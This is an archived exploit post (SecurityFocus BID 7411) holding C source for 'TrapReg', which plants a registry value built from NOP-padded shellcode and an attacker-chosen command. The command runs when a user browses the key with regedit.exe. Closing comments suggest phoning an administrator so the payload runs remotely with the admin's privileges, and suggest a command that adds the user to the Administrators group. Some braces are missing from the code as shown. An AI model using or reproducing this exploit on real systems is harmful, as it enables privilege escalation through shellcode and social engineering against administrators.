source: http://www.securityfocus.com/bid/7411/info

A problem has been reported in Microsoft Windows. Due to improper bounds checking by the regedit.exe program, it may be possible for a local attacker to execute arbitrary code as another user. 

/**************************************************
09/04/2003
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@ Trapped Registery for REGEDIT.EXE exploit @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+++++++++++++++++++++++++++++++++++++++++++++
+                                           +
+       Discovered & coded By ThreaT        +
+                                           +
+++++++++++++++++++++++++++++++++++++++++++++

Contact : ThreaT@Ifrance.com
URL     : http://www.chez.com/mvm

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This is a NEW exploit for a NEW vulnerability
in REGEDIT.EXE !

This one trap a KEY in the registery, that 
when a non informed user just try to BROWSE IT
with REGEDIT.EXE (localy or REMOTELY !) execute
an arbitrary command defined by attacker
without its knowledge !

The vulnerabitily appear to be in a RegEnumValueW
function misused in regedit.exe

By precaution, I council to use regedt32.exe
for your future registery manipulation.

This exploit as been tested on Win2K (fr) SP0,2,3,
and work with a local and remote browse of a 
trapped registery.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
compile -> cl /nologo TrapReg.c /link advapi32.lib
***************************************************/

#include <windows.h>

#define taille 620
#define mastar 1000
#define MaxCommandLen 135
#define DefaultKey "HKEY_LOCAL_MACHINE"

HKEY RootHandle (const char *ROOTKEY)
 
 int indice;

 struct _HandleKey {
  HKEY RK;
  char *KeyName;
 } HandleKey[5] = {
  {HKEY_CLASSES_ROOT, "HKEY_CLASSES_ROOT"},
  {HKEY_CURRENT_USER, "HKEY_CURRENT_USER"},
  {HKEY_LOCAL_MACHINE,"HKEY_LOCAL_MACHINE"},
  {HKEY_USERS,        "HKEY_USERS"},
  {NULL,'\0'},
 };

 for (indice=0; HandleKey[indice].RK ; indice++)
  if (!lstrcmpi (HandleKey[indice].KeyName,ROOTKEY))
   return HandleKey[indice].RK;

 printf ("'%s' is an unknow RootKey! You can only work with the following :\n"
  "- HKEY_CLASSES_ROOT\n"
  "- HKEY_CURRENT_USER\n"
  "- HKEY_LOCAL_MACHINE\n"
  "- HKEY_USERS\n",ROOTKEY);

 ExitProcess (0);
 return NULL;
 


void main (int argc, char *argv[])
 

 HKEY TrapedKey;

 char shellcode[] = 

 "\x50\xFC\x06\x00"

 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

 "\xEB\x69\x6A\x30\x5B\x64\x8B\x03\x8B\x40\x0C\x8B\x48\x0C\x8B\xC1" 
 "\x8B\x70\x30\x80\x3E\x4B\x75\x4A\x8B\x40\x18\x8B\x58\x3C\x03\xD8" 
 "\x8B\x5B\x78\x03\xD8\x8B\x73\x1C\x03\xF0\x56\x8B\x73\x24\x03\xF0" 
 "\x56\x8B\x53\x20\x03\xD0\x8B\x5B\x18\x4B\x8B\x34\x9A\x03\xF0\x03" 
 "\x74\x24\x10\x8B\x36\x39\x74\x24\x0C\x74\x08\x4B\x23\xDB\x75\xEA" 
 "\x58\x58\xC3\x5F\x33\xC9\x66\x8B\x0C\x5F\x5F\x8B\x3C\x8F\x8D\x04" 
 "\x07\xC3\x8B\x18\x39\x08\x8B\xC3\x75\xA6\xC3\xEB\x22\x6A\x01\x68" 
 "\x69\x6E\x45\x78\xE8\x89\xFF\xFF\xFF\x6A\x01\xFF\x74\x24\x0C\xFF"
 "\xD0\x6A\x01\x68\x78\x69\x74\x50\xE8\x75\xFF\xFF\xFF\xFF\xD0\xE8"
 "\xD9\xFF\xFF\xFF",

 *VulnBuff, *YourKey=NULL, *p=NULL, Data[] = "Mouarf";

 LONG ret;
 int i;


 printf ("###########################################\n"
  "Trapped Registery for REGEDIT.EXE exploit !\n"
  "###########################################\n"
  "Discovered & coded by ThreaT.\n\n"
  "URL  : http://www.chez.com/mvm\n"
  "MAIL : ThreaT@Ifrance.com\n\n");

 if (argc < 2 || strlen (argv[1]) > MaxCommandLen)
 {
  printf ("Usage : TrapReg.exe <command to be executed> [Key to trap]\n\n"

   "+ The first argument define the command to execute when our\n"
   "  favourit administrator will browse our trapped key :p\n\n"
    
   "+ The second argument is optional, you can specify with it the\n"
   "  path of the key to trap. (default is HKEY_LOCAL_MACHINE).\n\n"

   "The command to be executed cannot exceed %u caracters.\n",MaxCommandLen);

  ExitProcess (0);
 }


 if (!(VulnBuff = (char *) LocalAlloc (LPTR, mastar)))
 {
  printf ("Cannot allocat memory for making the evil buff !\n");
  ExitProcess (0);
 }
 
 i = sizeof (shellcode);

 memset (VulnBuff,0x90,taille);
 memcpy (&VulnBuff[taille],shellcode,i);
 lstrcpyn (&VulnBuff[taille+i-1],argv[1],MaxCommandLen);

 if (argc > 2)
 {
  i = lstrlen (argv[2]);
  if ( !(YourKey = LocalAlloc (LPTR,i+2)) )
  {
   printf ("Cannot allocat memory for store the name of key to trap !\n");
   ExitProcess (0);
  }

  lstrcpyn (YourKey,argv[2],i+1);

  if (p = strchr (YourKey, 0x5C))
   p[0]=0x00;
 }

 ret = RegOpenKeyEx (YourKey ? RootHandle (YourKey) : RootHandle (DefaultKey),
  p ? ++p : "", 0 , KEY_ALL_ACCESS, &TrapedKey);
 
 if (ret != ERROR_SUCCESS)
 {
  printf ("Cannot open '%s' for trap it !\n"
   "See error code number %u for more details.\n",
    YourKey ? argv[2] : DefaultKey , ret);
  ExitProcess (0);
 }

 ret = RegSetValueExW (TrapedKey,(const unsigned short *)VulnBuff,0,REG_SZ,(CONST BYTE *)&Data,mastar);
 
 if (ret == ERROR_SUCCESS)
 {
  printf ("'%s' is now trapped for execute '%s' "
   "when our favourite administrator will browse it whith REGEDIT.EXE :p\n",
   YourKey ? argv[2] : DefaultKey , argv[1]);

 } else printf ("Cannot write evil value to trap the registery !\n"
     "See error code number %u for more details.\n",ret);

 RegCloseKey (TrapedKey);
 

/************************************************************************

  a simple methode for test if your system is vulnerable 
  to the 'Trapped Registery for REGEDIT.EXE exploit' !

  after a succesfull compilation of the xploit, type the following
  command on a cmd prompt shell :

--
D:\code\exploits>TrapReg.exe "cmd /c echo WARRNING! you are vulnerable to the 
Trapped Registery for REGEDIT.EXE exploit! > c:\a.txt & c:\a.txt" HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft

###########################################
Trapped Registery for REGEDIT.EXE exploit !
###########################################
Discovered & coded by ThreaT.

URL  : http://www.chez.com/mvm
MAIL : ThreaT@Ifrance.com

'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft' is now trapped for execute 'cmd /c echo
WARRNING! you are vulnerable to the Trapped Registery for REGEDIT.EXE exploit! >
 c:\a.txt & c:\a.txt' when our favourite administrator will browse it whith REGEDIT.EXE :p

D:\code\exploits>
--

  Ok, everything seen to be good !
  now, launch REGEDIT.exe and go to HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft.

  If notepad (or your favourite text editor) appear with the sentence :
  "WARRNING! you are vulnerable to the Trapped Registery for REGEDIT.EXE exploit!"

  use regedt32.exe until Microsoft release a patch for regedit.exe :)


  For more fun, you can phone call your system administrator, and say him you have
  a problem with your registery at this specific key.

  When he will try to browse it remotely with regedit.exe, our arbitrary command
  will be executed to his computer with his privilege !

  So, nobody prevent you to trap your registery with a 'NET GROUP ADMINISTRATORS /ADD' :))

************************************************************************************/

